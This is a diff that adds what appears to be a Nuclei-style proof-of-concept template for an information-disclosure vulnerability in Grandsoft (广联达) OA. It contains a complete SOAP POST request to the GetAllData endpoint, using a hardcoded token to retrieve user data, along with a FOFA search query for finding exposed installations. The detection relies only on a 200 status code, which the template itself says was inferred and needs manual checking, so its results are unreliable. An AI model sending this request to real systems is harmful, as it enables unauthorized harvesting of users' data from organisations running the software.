@@ -1,0 +1,21 @@
+id: poc-28199c16fdce785e7a07
+info:
+  name: 广联达OAGetAllData存在信息漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/28199c16fdce785e7a07a3fd76cacc43
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 28199c16fdce785e7a07a3fd76cacc43
+    fofa: + app.name="广联达 OA"
+http:
+- raw:
+  - "POST /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nSOAPAction: http://tempuri.org/GetAllData\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 379\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:GetAllData>\n         <!--type: string-->\n         <tem:Token>!@#$asdf$#@!</tem:Token>\n\n         <!--type: string-->\n         <tem:DataType>user</tem:DataType>\n\n      </tem:GetAllData>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
